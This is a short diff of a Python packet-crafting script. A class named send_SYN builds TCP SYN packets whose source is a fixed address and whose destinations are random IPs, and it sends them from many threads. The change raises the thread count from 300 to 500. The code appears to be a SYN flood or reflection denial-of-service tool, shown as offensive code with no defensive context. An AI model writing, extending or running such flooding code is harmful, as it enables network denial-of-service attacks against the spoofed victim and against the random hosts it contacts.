@@ -21,7 +21,7 @@ class send_SYN(threading.Thread):
     def run(self) :
         a = IP()
         a.src = ip_addr
-        a.dst = "%i.%i.%i.%i" % (random.randint(1,254), random.randint(1,254), random.randint(1,254), random.randint(1,254), )
+        a.dst = "%i.%i.%i.%i" % (random.randint(1,254), random.randint(1,254), random.randint(1,254), random.randint(1,254))
 
         b = TCP()
         b.sport = random.randint(1, 65535)
@@ -46,7 +46,7 @@ if __name__ == '__main__':
 
     open_files()
 
-    while(i < 300) :
+    while(i < 500) :
         send_SYN().start()
         i += 1
 
